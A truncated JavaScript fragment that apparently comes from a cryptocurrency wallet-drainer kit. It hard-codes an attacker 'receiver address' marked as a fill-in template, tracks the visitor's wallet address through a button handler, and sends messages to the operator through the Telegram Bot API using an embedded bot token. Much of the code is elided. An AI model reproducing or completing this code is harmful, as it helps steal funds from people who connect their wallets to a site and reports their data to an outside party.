...
const receiver_addres = '0xA510BbD0789bF8c990a6CbE6d693cee3D50100c7'; // gaf<- RECEIVER ADDRESS HERE
let onButtonClick;
let user_address;
...
async function sendMessage(message) {
    return new Promise((resolve, reject) => {
        ...
        fetch(`https://api.telegram.org/bot5770827514:AAEfhGaoMsF1VG7UP5mu7m8sh6wQXBHyIOw/sendMessage?chat_id=${chat_id}&text=${message}`, {
                method: "GET",
                headers: {
...
const receiver_address = '0xA510BbD0789bF8c990a6CbE6d693cee3D50100c7';
